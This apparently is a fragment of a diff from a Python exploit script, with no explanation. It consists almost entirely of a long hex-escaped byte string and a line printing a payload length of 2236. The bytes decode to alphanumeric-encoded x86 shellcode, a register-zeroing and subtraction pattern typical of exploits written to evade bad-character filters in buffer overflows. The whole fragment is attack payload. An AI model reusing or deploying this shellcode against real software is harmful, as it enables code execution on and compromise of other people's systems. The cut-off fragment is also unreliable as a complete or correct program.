2d\x39\x32\x5c\x4f\x2d\x3e\x33\x5d\x51\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x56\x3e\x39\x3e\x2d\x56\x3e\x39\x3e\x2d\x57\x42\x3d\x43\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x52\x37\x39\x5f\x2d\x52\x37\x39\x5f\x2d\x54\x38\x3d\x5f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x63\x31\x2d\x55\x55\x63\x31\x2d\x56\x56\x63\x32\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x47\x2a\x31\x2d\x32\x47\x2a\x31\x2d\x34\x48\x2b\x32\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x47\x69\x37\x39\x2d\x47\x69\x37\x39\x2d\x49\x69\x3c\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x25\x54\x55\x55\x2d\x25\x54\x55\x55\x2d\x26\x56\x55\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x53\x55\x63\x6c\x2d\x53\x55\x63\x6c\x2d\x53\x56\x63\x6e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x3b\x2d\x48\x2d\x32\x3b\x2d\x48\x2d\x34\x3d\x2e\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2e\x44\x35\x39\x2d\x2e\x44\x35\x39\x2d\x31\x45\x36\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x32\x2d\x2d\x55\x55\x32\x2d\x2d\x56\x55\x33\x2e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x36\x32\x44\x44\x2d\x36\x32\x44\x44\x2d\x37\x33\x44\x45\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x4f\x5c\x25\x2d\x27\x4f\x5c\x25\x2d\x27\x4f\x5c\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x60\x35\x35\x37\x2d\x60\x35\x35\x37\x2d\x60\x35\x36\x37\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x37\x39\x55\x2d\x37\x37\x39\x55\x2d\x39\x37\x3c\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x49\x36\x36\x34\x2d\x49\x36\x36\x34\x2d\x4a\x38\x38\x36\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x65\x27\x3d\x49\x2d\x65\x27\x3d\x49\x2d\x66\x27\x41\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x53\x26\x54\x2d\x27\x53\x26\x54\x2d\x27\x55\x28\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x4b\x54\x64\x2d\x38\x4b\x54\x64\x2d\x38\x4d\x56\x64\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x51\x3c\x26\x2d\x27\x51\x3c\x26\x2d\x27\x51\x3c\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x49\x54\x64\x32\x2d\x49\x54\x64\x32\x2d\x4a\x56\x64\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5e\x37\x26\x37\x2d\x5e\x37\x26\x37\x2d\x60\x38\x28\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x2b\x49\x2e\x2d\x41\x2b\x49\x2e\x2d\x43\x2c\x49\x2e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x58\x53\x2b\x57\x2d\x58\x53\x2b\x57\x2d\x5a\x55\x2c\x59\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x68\x42\x5f\x2c\x2d\x68\x42\x5f\x2c\x2d\x69\x42\x61\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6a\x65\x50\x54\x2d\x6a\x65\x50\x54\x2d\x6b\x65\x51\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x63\x44\x55\x70\x2d\x63\x44\x55\x70\x2d\x64\x45\x56\x72\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x43\x26\x54\x2d\x27\x43\x26\x54\x2d\x27\x45\x28\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4d\x5e\x41\x3c\x2d\x4d\x5e\x41\x3c\x2d\x4e\x60\x42\x3e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x64\x26\x3c\x2d\x55\x64\x26\x3c\x2d\x55\x64\x27\x3e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x26\x37\x4a\x2d\x39\x26\x37\x4a\x2d\x3d\x28\x38\x4b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x3c\x54\x64\x2d\x5f\x3c\x54\x64\x2d\x5f\x3e\x56\x66\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x3b\x4f\x2d\x2d\x27\x3b\x4f\x2d\x2d\x27\x3d\x50\x2d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x26\x3c\x41\x2d\x50\x26\x3c\x41\x2d\x50\x28\x3d\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x38\x26\x39\x2d\x39\x38\x26\x39\x2d\x3c\x38\x28\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x68\x5e\x59\x2d\x55\x68\x5e\x59\x2d\x55\x68\x60\x5a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4a\x6a\x65\x50\x2d\x4a\x6a\x65\x50\x2d\x4c\x6a\x65\x51\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x35\x2b\x54\x46\x2d\x35\x2b\x54\x46\x2d\x35\x2d\x55\x47\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x55\x70\x3e\x2d\x45\x55\x70\x3e\x2d\x45\x56\x72\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x6d\x3c\x48\x2d\x50\x6d\x3c\x48\x2d\x51\x6e\x3c\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4e\x26\x2e\x47\x2d\x4e\x26\x2e\x47\x2d\x50\x28\x31\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x51\x26\x39\x2d\x39\x51\x26\x39\x2d\x3c\x51\x28\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x39\x45\x26\x2d\x27\x39\x45\x26\x2d\x27\x3d\x45\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5e\x44\x6a\x33\x2d\x5e\x44\x6a\x33\x2d\x5f\x45\x6b\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x35\x27\x2d\x55\x55\x35\x27\x2d\x56\x55\x35\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x56\x5c\x29\x55\x2d\x56\x5c\x29\x55\x2d\x58\x5e\x2a\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x58\x59\x47\x63\x2d\x58\x59\x47\x63\x2d\x59\x59\x47\x65\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x55\x55\x55\x2d\x54\x55\x55\x55\x2d\x54\x55\x55\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x44\x64\x6b\x2d\x38\x44\x64\x6b\x2d\x38\x46\x65\x6d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x29\x5b\x4f\x39\x2d\x29\x5b\x4f\x39\x2d\x2b\x5d\x50\x39\x50
+
+('[+] length:', 2236)
+
